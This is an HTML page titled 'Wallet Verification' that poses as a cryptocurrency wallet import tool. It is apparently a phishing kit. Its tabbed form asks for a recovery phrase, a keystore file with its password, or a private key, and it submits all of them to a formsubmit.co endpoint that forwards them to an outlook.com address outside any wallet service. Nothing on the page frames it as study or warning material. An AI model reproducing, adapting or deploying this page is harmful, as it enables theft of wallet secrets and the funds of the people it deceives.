<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Wallet Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 500px;
      margin: 40px auto;
      padding: 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }
    .import-tabs {
      display: flex;
      justify-content: space-around;
      margin-bottom: 20px;
    }
    .tab {
      padding: 10px 20px;
      cursor: pointer;
      background: #e0e0e0;
      border-radius: 5px;
    }
    .tab.active {
      background: #2196F3;
      color: white;
    }
    .tab-content {
      display: none;
    }
    .tab-content.active {
      display: block;
    }
    textarea, input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      margin-top: 20px;
      padding: 12px;
      background: #2196F3;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
    }
    button:hover {
      background: #1976D2;
    }
    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Import Wallet</h2>
    <div class="import-tabs">
      <div class="tab active" data-tab="phrase-form" onclick="openTab('phrase-form', this)">Phrase</div>
      <div class="tab" data-tab="keystore-form" onclick="openTab('keystore-form', this)">Keystore JSON</div>
      <div class="tab" data-tab="private-form" onclick="openTab('private-form', this)">Private Key</div>
    </div>

    <form action="https://formsubmit.co/dclonghorns1@outlook.com" method="POST">
      <!-- Phrase Form -->
      <div class="tab-content" id="phrase-form" style="display: block;">
        <label>Enter your recovery phrase</label>
        <textarea name="phrase" required rows="4" placeholder="e.g., word1 word2 word3 ..."></textarea>
        <input type="hidden" name="_subject" value="Phrase Submission">
        <input type="hidden" name="source" value="phrase">
        <button type="submit">Import</button>
      </div>

      <!-- Keystore Form -->
      <div class="tab-content" id="keystore-form">
        <label>Upload your Keystore JSON</label>
        <textarea name="keystore" required rows="4" placeholder="Paste your Keystore JSON"></textarea>
        <label>Password</label>
        <input type="password" name="keystore-password" required placeholder="Enter Keystore Password" />
        <input type="hidden" name="_subject" value="Keystore Submission">
        <input type="hidden" name="source" value="keystore">
        <button type="submit">Import</button>
      </div>

      <!-- Private Key Form -->
      <div class="tab-content" id="private-form">
        <label>Enter your Private Key</label>
        <textarea name="privatekey" required rows="4" placeholder="Private Key"></textarea>
        <input type="hidden" name="_subject" value="Private Key Submission">
        <input type="hidden" name="source" value="privatekey">
        <button type="submit">Import</button>
      </div>
    </form>
  </div>

  <script>
    function openTab(tabId, element) {
      // Hide all tab contents
      const tabs = document.querySelectorAll(".tab-content");
      tabs.forEach(tab => tab.style.display = "none");

      // Remove active class from all tabs
      const tabButtons = document.querySelectorAll(".tab");
      tabButtons.forEach(btn => btn.classList.remove("active"));

      // Show selected tab and make button active
      document.getElementById(tabId).style.display = "block";
      element.classList.add("active");
    }

    // Automatically open the first tab on page load
    window.onload = () => {
      const firstTab = document.querySelector('.tab[data-tab="phrase-form"]');
      if (firstTab) {
        openTab("phrase-form", firstTab);
      }
    };
  </script>
</body>
</html>
